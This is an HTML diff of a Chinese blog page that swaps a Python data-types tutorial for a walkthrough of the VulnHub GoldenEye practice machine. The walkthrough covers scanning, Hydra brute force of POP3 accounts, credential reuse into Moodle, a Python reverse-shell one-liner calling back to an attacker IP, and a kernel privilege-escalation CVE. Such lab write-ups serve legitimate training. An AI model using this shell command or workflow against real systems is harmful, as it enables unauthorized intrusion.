@@ -4,28 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="pyhon数据类型">
-    <meta name="description" content="python数据类型概况
-数字类型
-字符类型
-布尔类型
-空类型
-列表类型
-元组类型
-字典类型
-整型int
-
-
-整型就是所说的整数，0也是整数，但是特殊的整数
-
-
-int即是整型的代表，又是定义整型的内置函数
-
-
-浮点型
-
-
-浮点型就是我们生">
+    <meta name="keywords" content="GoldenEye靶机详解">
+    <meta name="description" content="靶机基本信息
+靶机地址：https://www.vulnhub.com/entry/goldeneye-1,240/靶机发布日期：2018年5月4日 靶机描述：靶机命名来自詹士邦系列的电影——GoldenEye 目标：得到root权限&amp;am">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -37,7 +18,7 @@ int即是整型的代表，又是定义整型的内置函数
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>python数据类型 | 阿浩の博客</title>
+    <title>GoldenEye靶机详解 | 阿浩の博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -426,12 +407,12 @@ int即是整型的代表，又是定义整型的内置函数
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">python数据类型</h1>
+                    <h1 class="description center-align post-title">GoldenEye靶机详解</h1>
                 </div>
             </div>
         </div>
@@ -455,8 +436,16 @@ int即是整型的代表，又是定义整型的内置函数
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/python/">
-                                <span class="chip bg-color">python</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                <span class="chip bg-color">渗透测试</span>
+                            </a>
+                        
+                            <a href="/tags/vulnhub/">
+                                <span class="chip bg-color">vulnhub</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
                             </a>
                         
                     </div>
@@ -467,8 +456,8 @@ int即是整型的代表，又是定义整型的内置函数
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/python/" class="post-category">
-                                python
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -480,21 +469,21 @@ int即是整型的代表，又是定义整型的内置函数
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-24
+                    2023-10-18
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-02-14
+                    2023-10-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.8k
+                    2.6k
                 </div>
                 
 
@@ -519,507 +508,209 @@ int即是整型的代表，又是定义整型的内置函数
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="python数据类型概况">python数据类型概况</h2>
-<p><strong>数字类型</strong></p>
-<p><strong>字符类型</strong></p>
-<p><strong>布尔类型</strong></p>
-<p><strong>空类型</strong></p>
-<p><strong>列表类型</strong></p>
-<p><strong>元组类型</strong></p>
-<p><strong>字典类型</strong></p>
-<h3 id="整型int">整型int</h3>
+                <h2 id="靶机基本信息">靶机基本信息</h2>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/%E9%9D%B6%E6%9C%BA%E5%8F%91%E5%B8%83%E6%97%A5%E6%9C%9F%EF%BC%9A2018%E5%B9%B45%E6%9C%884%E6%97%A5">https://www.vulnhub.com/entry/goldeneye-1,240/靶机发布日期：2018年5月4日</a> 靶机描述：靶机命名来自詹士邦系列的电影——GoldenEye 目标：得到root权限&amp;找到flag.txt</p>
+<h2 id="主机发现">主机发现</h2>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182232927.png" alt=""></p>
+<p>命令<code>sudo arp-scan -l</code>，作用是扫描本地局域网的IP+MAC</p>
+<p>确认靶场IP地址为192.168.255.185</p>
+<p>也可以通过使用<mark>nmap</mark>进行主机发现</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182232395.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182232551.png" alt=""></p>
+<p>nmap命令参数<code>-sn</code>和<code>-sP</code> 这两个参数都是只利用ping扫描进行主机发现，不扫描目标主机的端口</p>
+<h2 id="端口扫描">端口扫描</h2>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182232163.png" alt=""></p>
+<p>可以发现靶场开发了25和80端口</p>
+<p>nmap命令参数解释：</p>
 <ul class="lvl-0">
 <li class="lvl-2">
-<p>整型就是所说的整数，0也是整数，但是特殊的整数</p>
+<p><code>-sS</code> ：TCP SYN扫描，半开放扫描，速度快隐蔽性好（不完成TCP连接），能够明确区分端口状态</p>
 </li>
 <li class="lvl-2">
-<p><mark>int</mark>即是整型的代表，又是定义整型的<mark>内置函数</mark></p>
+<p><code>-sV</code> ：进行服务版本探测</p>
+</li>
+<li class="lvl-2">
+<p><code>-T&lt;0-5&gt;</code>  ：设置时间模板级数,在0- 5中选择。T0、T1用于IDS规避, T2降低了扫描速度以使用更少的带宽和资源。默认为T3 ,未做任何优化。T4假设具有合适及可靠的网络从而加速扫描。T5假设具有特别快的网络或者愿为速度牺牲准确性</p>
+</li>
+<li class="lvl-2">
+<p><code>-A</code> ：同时启用操作系统探测和服务版本探测(万能开关)</p>
 </li>
 </ul>
-<h3 id="浮点型">浮点型</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>浮点型就是我们生活中的小数，凡是带有小数点的类型，都可以认为是浮点型</p>
-</li>
-<li class="lvl-2">
-<p>在python中，<mark>float</mark>既是浮点型的代表，又是浮点型类型定义的内置函数</p>
-</li>
-<li class="lvl-2">
-<p>定义<mark>float</mark>类型的时候，并不需要一定使用<mark>float</mark>声明</p>
-</li>
-</ul>
-<h3 id="内置函数–type">内置函数–type</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>返回变量的类型</p>
-</li>
-<li class="lvl-2">
-<p><mark>type</mark>（已经被赋值的变量名或变量）</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">count = 1050
-print(type(count))
-print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-</li>
-</ul>
-<h3 id="字符串">字符串</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>用 " 或者 “” 包裹的信息，就是字符串</p>
-</li>
-<li class="lvl-2">
-<p>字符串中可以包含任意字符：如字母，数字，符号，且没有先后顺序</p>
-</li>
-</ul>
-<h4 id="字符串的定义方法">字符串的定义方法</h4>
-<p>在python中，使用<mark>str</mark>来代表字符串类型，并且通过该函数可以定义字符串</p>
-<h4 id="字符串的重要思想">字符串的重要思想</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>字符串是不可改变的！</p>
-</li>
-</ul>
-<h4 id="内置函数id">内置函数id</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>返回变量的内存地址</p>
-</li>
-<li class="lvl-2">
-<p>数字地址 = <mark>id</mark>(变量)</p>
-</li>
-</ul>
-<h4 id="内置函数">内置函数</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>返回字符串的长度</p>
-</li>
-<li class="lvl-2">
-<p>无法返回数字类型的长度，因为数字类型没有长度</p>
-</li>
-<li class="lvl-2">
-<p>返回 = len(字符串)</p>
-</li>
-</ul>
-<h4 id="内置成员运算符in的使用">内置成员运算符<mark>in</mark>的使用</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>成员运算符是用来判断你的数据中是否存在你想要的成员</p>
-</li>
-</ul>
-<h4 id="内置函数max">内置函数<mark>max</mark></h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p><mark>max</mark>(数据) -&gt; 成员值     <code>print(max(''今天是1月3日!'))</code>    -&gt; <mark>月</mark></p>
-</li>
-<li class="lvl-2">
-<p><strong>规则</strong>：中文符号 &gt; 字母 &gt; 数字 &gt; 英文符号</p>
-</li>
-<li class="lvl-2">
-<p>中文按照拼音的首字母来计算</p>
-</li>
-</ul>
-<h4 id="内置函数min">内置函数<mark>min</mark></h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p><mark>min</mark>函数返回数据中最小的成员  <code>pinrt(min('今天是1月3日!'))</code>  -&gt; !</p>
-</li>
-<li class="lvl-2">
-<p>min(数据) &gt; 字母 &gt; 数字 &gt; 英文符号</p>
-</li>
-<li class="lvl-2">
-<p><strong>规则</strong>：中文符号 &gt; 字母 &gt; 数字 &gt; 英文符号</p>
-</li>
-<li class="lvl-2">
-<p>中文按照拼音的首字母来计算</p>
-</li>
-</ul>
-<h4 id="字符串的累加">字符串的累加</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>字符串不是数字不能做减法，乘除法</p>
-</li>
-<li class="lvl-2">
-<p>字符串的拼接，用 “+” 这个符号</p>
-</li>
-</ul>
-<h3 id="布尔类型">布尔类型</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>定义：真假的判断 即 布尔类型</p>
-</li>
-<li class="lvl-2">
-<p>固定值：True -&gt; 真；False -&gt; 假；</p>
-</li>
-<li class="lvl-2">
-<p>布尔值</p>
-</li>
-</ul>
-<h4 id="布尔类型的使用">布尔类型的使用</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p><mark>bool</mark>代表布尔类型，也可以对于结果进行真假的判读</p>
-</li>
-</ul>
-<h4 id="使用场景">使用场景</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>常被用来判断一件事儿的真假</p>
-</li>
-</ul>
-<h4 id="数字与字符串的布尔应用">数字与字符串的布尔应用</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>int 0 -&gt; False，非0 -&gt; True</p>
-</li>
-<li class="lvl-2">
-<p>float 0.0 -&gt; False，非0.0 -&gt; True</p>
-</li>
-<li class="lvl-2">
-<p>str " -&gt; False(即 空字符串)，非空字符串 -&gt; True</p>
-</li>
-<li class="lvl-2">
-<p>在计算机中0 1是计算机的最原始形态，单个占空间也最小，故而经常会将0 1用来替代True与False</p>
-</li>
-</ul>
-<h3 id="pyhton中的空类型">pyhton中的空类型</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>不属于任何数据类型就是<mark>空类型</mark></p>
-</li>
-<li class="lvl-2">
-<p>固定值：<mark>None</mark></p>
-</li>
-<li class="lvl-2">
-<p>空类型 属于 <mark>False</mark>的范畴</p>
-</li>
-<li class="lvl-2">
-<p>如果不确定类型的时候可以使用<mark>空类型</mark></p>
-</li>
-</ul>
-<h3 id="列表类型">列表类型</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>列表就是队列</p>
-</li>
-<li class="lvl-3">
-<p>他是各种数据类型的集合，也是一种数据结构</p>
-</li>
-<li class="lvl-2">
-<p>列表是一种有序，且内容可重复的集合类型</p>
-</li>
-</ul>
-<h4 id="列表的定义">列表的定义</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>在python中，<mark>list</mark>代表这种类型，也可以用它定义一个列表  <code>name_01=list(['',''])</code></p>
-</li>
-<li class="lvl-2">
-<p>在python中，列表中的元素存在于一个[]中  <code>name_02=['','']</code></p>
-</li>
-<li class="lvl-2">
-<p>在python中，列表是一个无限制长度的数据结构</p>
-</li>
-</ul>
-<h4 id="列表中的类型">列表中的类型</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p><strong>str_array</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>int_array</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>float_array</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>bool_array</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>list_array</strong>  列表中嵌套列表</p>
-</li>
-<li class="lvl-2">
-<p><strong>min_array</strong>  列表中可以放混合类型</p>
-</li>
-</ul>
-<h4 id="in，max，min在列表中的使用">in，max，min在列表中的使用</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>1 in [1,2,3,4] -&gt; True; 10 in  [1,2,3,4] -&gt; False</p>
-</li>
-<li class="lvl-2">
-<p>max([1,2,3,4]) -&gt; 4</p>
-</li>
-<li class="lvl-2">
-<p>min([1,2,3,4]) -&gt; 1</p>
-</li>
-<li class="lvl-2">
-<p>max和min在列表中使用的时候，列表中的元素不能是多种类型，如果类型不统一，则会报错</p>
-</li>
-</ul>
-<h3 id="元组">元组</h3>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>元组和列表一样，都是一种可以存储多种数据结构的队列</p>
-</li>
-<li class="lvl-2">
-<p>元组也是一个有序的，且元素可以重复的集合</p>
-</li>
-</ul>
-<h4 id="元组的定义">元组的定义</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>在python中，tuple代表着元组这种类型，也可以用它定义一个元组   <code>name_01=tuple('','')</code></p>
-</li>
-<li class="lvl-2">
-<p>在python中，元组中的元素存在于一个（）小括号中  <code>name_02=('','')</code></p>
-</li>
-<li class="lvl-2">
-<p>在python中，元组是一个无限制长度的数据结构</p>
-</li>
-</ul>
+<p>简单的端口扫描：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182232869.png" alt=""></p>
+<p>可以发现还开放了55006和55007端口</p>
+<h2 id="信息收集">信息收集</h2>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.185">http://192.168.255.185</a>：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182232803.png" alt=""></p>
+<p>翻译一下：</p>
+<p>TOP SECRET ACCESS  绝密访问</p>
+<p>Accessing Server Identity  访问服务器身份</p>
+<p>Server Name 服务器名称</p>
+<p>Naviagate  导航</p>
+<p>大概的意思：你需要账户密码才能访问GOLDENEYE服务器，从/sev-home/这个目录进入登录</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.255.185/sev-home/">http://192.168.255.185/sev-home/</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182232873.png" alt=""></p>
+<p>需要账户密码才能进入</p>
+<p>开始进行信息收集：</p>
+<p>查看<a target="_blank" rel="noopener" href="http://192.168.255.xn--185-qs9d216l97jjqc">http://192.168.255.185的源代码</a>：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233567.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233364.png" alt=""></p>
+<p>可以发现两个用户名：Boris、Natalya</p>
+<p>把<code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code>这串字符拿去html解码后得：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233855.png" alt=""></p>
+<p>先翻译一下源代码中那段话的意思：</p>
+<p>Boris, make sure you update your default password.</p>
+<p>Boris，确保更新你的默认密码。</p>
+<p>My sources say MI6 maybe planning to infiltrate.</p>
+<p>我的线人说MI6可能打算渗透进来。</p>
+<p>Be on the lookout for any suspicious network traffic</p>
+<p>留意任何可疑的网络流量</p>
+<p>BTW Natalya says she can break your codes</p>
+<p>BTW Natalya说她能破解你的密码</p>
+<p>通过以上信息，那说明<mark>InvincibleHack3r</mark>有可能是Boris的密码</p>
+<p>尝试登录：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233810.png" alt=""></p>
+<p>登录不进去，将Boris的首字母改成小写看看</p>
+<p>登录成功：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233494.png" alt=""></p>
+<p>再查看源代码看看：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233026.png" alt=""></p>
+<p>翻译一下：</p>
+<p>Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)</p>
+<p>由于您拥有访问权限，您肯定持有绝密许可，并有资格成为一名合格的GoldenEye网络操作员（GNO）。</p>
+<p>is very effective, we have configured our pop3 service to run on a very high non-default port</p>
+<p>非常有效，我们将 pop3 服务配置为在一个非常高的非默认端口上运行</p>
+<p>从上面的信息中，我们可以了解到某个非默认端口上正在运行一个活动的POP3服务，再结合之前的端口扫描结果，它开放了55006、55007两个端口，扫描这个两个端口开启的服务详细信息：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233215.png" alt=""></p>
+<p>命令参数<code>-p+端口</code> 是指的端口扫描</p>
+<p>通过的扫描结果信息，看出这两个端口开放了pop3的mail服务的，通过之前访问<a target="_blank" rel="noopener" href="http://192.168.255.185/terminal.js%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%9C%A8%E6%B3%A8%E9%87%8A%E4%B8%AD%E5%8F%91%E7%8E%B0%E4%B8%80%E6%9D%A1%E5%86%85%E5%AE%B9%EF%BC%8C%E6%8C%87%E5%87%BA%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E6%AD%A3%E5%9C%A8%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E3%80%82%EF%BC%88%E6%B3%A8%E9%87%8A%E5%86%85%E5%AE%B9%EF%BC%9A//Boris">http://192.168.255.185/terminal.js页面，在注释中发现一条内容，指出目标系统正在使用默认密码。（注释内容：//Boris</a>, make sure you update your default password. ）</p>
+<p>尝试暴力破解：</p>
+<p>在之前的信息收集找到的用户名"boris、natalya"，通过Hydra暴力破解pop3服务：</p>
+<p>将这两个用户名<mark>boris、natalya</mark>写入字典username.txt</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233034.png" alt=""></p>
+<p>开始爆破：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233337.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233217.png" alt=""></p>
+<p>爆破结果：</p>
+<p>用户：natalya 密码：bird</p>
+<p>用户：boris 密码：secret1!</p>
+<p>通过nc登录pop3查看邮件信封内容枚举：</p>
+<p>user 用户名  --登录邮箱</p>
+<p>pass 密码  --登录密码</p>
+<p>list  --查看邮件数量</p>
+<p>retr 1~3  --查看邮件内容</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182233277.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234075.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234832.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234737.png" alt=""></p>
+<p>两封邮件：</p>
+<p>第一封邮件：娜塔莉亚，请你停止破解鲍里斯的密码。 此外，您是 GNO 培训主管。 一旦学生被指定给你，我就会给你发电子邮件。此外，请注意可能的网络漏洞。 我们获悉，一个名为 Janus 的犯罪集团正在追捕 GoldenEye。</p>
+<p>第二封邮件：好的 Natalyn 我有一个新学生给你。 由于这是一个新系统，如果您看到任何配置问题，请告诉我或鲍里斯，尤其是它与安全有关的问题……即使不是，也只需以“安全”为幌子输入……它就会 轻松升级变更单:)<br>
+好的，用户信用是：用户名：xenia<br>
+密码：RCP90rulez！鲍里斯验证了她是一个有效的承包商，所以只需创建帐户好吗？如果您没有外部内部域的 URL：<a target="_blank" rel="noopener" href="http://severnaya-station.com/gnocertdir">severnaya-station.com/gnocertdir</a><br>
+请务必编辑您的主机文件，因为您通常在远程离线工作…</p>
+<p>由于您是 Linux 用户，因此只需将此服务器 IP 指向 /etc/hosts 中的 <a target="_blank" rel="noopener" href="http://severnaya-station.com">severnaya-station.com</a>。</p>
+<p>在第二封邮件看到了另外一个用户名密码，此服务器域名和网站，还要求我们在本地服务hosts中添加域名信息：用户名：xenia<br>
+密码：RCP90rulez!<br>
+域：<a target="_blank" rel="noopener" href="http://severnaya-station.com">severnaya-station.com</a><br>
+网址：<a target="_blank" rel="noopener" href="http://severnaya-station.com/gnocertdir">severnaya-station.com/gnocertdir</a><br>
+我们现根据邮件提示添加本地域名：<a target="_blank" rel="noopener" href="http://severnaya-station.com">severnaya-station.com</a></p>
+<p>设置本地HOST文件：</p>
+<p><code>sudo vim /etc/hosts</code></p>
+<p>添加：</p>
+<p>192.168.255.185 <a target="_blank" rel="noopener" href="http://severnaya-station.com">severnaya-station.com</a></p>
+<p>访问<a target="_blank" rel="noopener" href="http://severnaya-station.com/gnocertdir%E5%9C%B0%E5%9D%80%EF%BC%9A">http://severnaya-station.com/gnocertdir地址：</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234663.png" alt=""></p>
+<p>该网站使用moodle，这是一个开源的CMS系统，需要使用邮件获得的用户密码进行登录</p>
+<p>使用<mark>whatweb</mark>进行指纹识别：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234372.png" alt=""></p>
+<p>点击：Intro to GoldenEye可以进行登录，使用natalya邮箱第二封邮件获得的用户名密码登录：用户名：xenia<br>
+密码：RCP90rulez!</p>
+<p>Home -&gt; My profile -&gt; Messages —&gt;发现有一封邮件，内容发现用户名doak</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234136.png" alt=""></p>
+<p>使用Hydra爆破用户名doak的邮件</p>
+<p>echo doak &gt; username.txt   —将用户名写入txt文本中</p>
+<p>进行爆破：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234615.png" alt=""></p>
+<p>登录doak用户枚举邮件信息</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234309.png" alt=""></p>
+<p>邮件消息说，为我们提供了更多登录凭据以登录到应用程序。让我们尝试使用这些凭据登录。用户名：dr_doak<br>
+密码：4England!</p>
+<p>使用新的账户密码登录CMS</p>
+<p>登录后在：Home -&gt; My home 右边发现： s3cret.txt</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234292.png" alt=""></p>
+<p>点击下载，查看内容：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234490.png" alt=""></p>
+<p>访问页面：<a target="_blank" rel="noopener" href="http://severnaya-station.com/dir007key/for-007.jpg">severnaya-station.com/dir007key/for-007.jpg</a></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182234769.png" alt=""></p>
+<p>下载到本地：<br>
+wget <a target="_blank" rel="noopener" href="http://severnaya-station.com/dir007key/for-007.jpg">http://severnaya-station.com/dir007key/for-007.jpg</a></p>
+<p><code>exiftool for-007.jpg</code><br>
+<code>strings for-007.jpg</code><br>
+用这两条命令都可以查看到base64编码隐藏信息：eFdpbnRlcjE5OTV4IQ==</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235357.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235777.png" alt=""></p>
+<p>base64解码：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235186.png" alt=""></p>
+<p>获得密码，根据线索中，这是管理员用户的密码，使用管理员用户身份继续登录应用</p>
+<p>用户名：admin<br>
+密码：xWinter1995x!</p>
+<p>登录：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235741.png" alt=""></p>
+<p>进去内容太多了，花了很多时间查看，和我前面使用dr_doak用户登陆邮箱发现的结果一致。</p>
+<h2 id="漏洞发现">漏洞发现</h2>
+<p>这是Moodle使用的2.2.3版本，可以搜索了网上的可用漏洞。</p>
+<p>Moodle 2.2.3 exp cve   --&gt; CVE-2013-3630 漏洞可利用！ 29324</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>此版本有许多漏洞利用，由于我们需要在目标计算机上进行外壳访问，因此我选择使用远程代码执行（RCE）漏洞利用。</p>
+<p>这里使用MSF</p>
+<p>可以使用这个模块 exploit/multi/http/moodle_cmd_exec</p>
+<p>但是我的kali的MSF好像没有这个模块，这里使用另一种方法getshell</p>
+<p>Toggle spellchecker</p>
+<p>反弹shell代码：</p>
+<p><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.255.129",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
+<p>注意：192.168.255.129该ip为攻击机本地ip，6666为本地监听端口</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235259.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235568.png" alt=""></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235811.png" alt=""></p>
+<p>本地监听成功：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235577.png" alt=""></p>
+<p>伪终端：</p>
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")' </code></p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235935.png" alt=""></p>
+<h2 id="权限提升">权限提升</h2>
+<p><code>uname -a</code> ：显示全部的信息，包括内核名称、主机名、操作系统版本、处理器类型和硬件架构等</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202310182235487.png" alt=""></p>
+<p>搜索引擎搜索：Linux ubuntu 3.13.0-32 exploit<br>
+获得exp版本：37292</p>
 <blockquote>
-<p>注：如果元组中只有一个元素，那一定要在这个元素后面加上一个逗号</p>
+<p>CVE(CAN) ID: CVE-2015-1328</p>
+<p>overlayfs文件系统是一种叠合式文件系统，实现了在底层文件系统上叠加另一个文件系统。Linux 内核3.18开始已经加入了对overlayfs的支持。Ubuntu Linux内核在更早的版本就已加入该支持。</p>
+<p>Ubuntu Linux内核的overlayfs文件系统实现中存在一个权限检查漏洞，本地普通用户可以获取管理员权限。此漏洞影响所有目前官方支持的Ubuntu Linux版本，目前已经发布攻击代码，建议受影响用户尽快进行升级。</p>
+<p>此漏洞源于overlayfs文件系统在上层文件系统目录中创建新文件时没有正确检查文件权限。它只检查了被修改文件的属主是否有权限在上层文件系统目录写入，导致当从底层文件系统目录中拷贝一个文件到上层文件系统目录时，文件属性也随同拷贝过去。如果Linux内核设置了CONFIG_USER_NS=y和FS_USERNS_MOUNT标志，将允许一个普通用户在低权限用户命名空间中mout一个overlayfs文件系统。本地普通用户可以利用该漏洞在敏感系统目录中创建新文件或读取敏感文件内容，从而提升到管理员权限。</p>
 </blockquote>
-<h4 id="列表与元组的区别">列表与元组的区别</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>元组比列表占用资源更小</p>
-</li>
-<li class="lvl-2">
-<p>列表是可变的，元组是不可变的</p>
-</li>
-</ul>
-<h4 id="元组中的类型">元组中的类型</h4>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p><strong>str_tuple</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>int_tuple</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>float_tuple</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>bool_tuple</strong></p>
-</li>
-<li class="lvl-2">
-<p><strong>none_tuple</strong>=(None,None,None)</p>
-</li>
-<li class="lvl-2">
-<p><strong>tuple_tuple</strong>=((1,2,3),(1.2,3.1))</p>
-</li>
-<li class="lvl-2">
-<p><strong>list_type</strong>=([123,456],[6789,1234])</p>
-</li>
-<li class="lvl-2">
-<p><strong>mix_tuple</strong>=(‘’,1,3.14,None,True)</p>
-</li>
-<li class="lvl-2">
-<p><strong>tuple_array</strong>=[(‘a’,‘b’),(‘c’,‘d’),(‘e’,)]</p>
-</li>
-</ul>
